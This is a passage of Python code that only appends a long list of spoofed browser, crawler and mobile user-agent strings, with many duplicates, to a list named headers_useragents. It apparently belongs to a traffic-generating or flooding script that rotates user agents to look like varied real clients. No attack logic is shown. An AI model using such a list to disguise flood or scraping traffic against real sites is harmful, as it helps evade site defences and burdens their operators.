	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
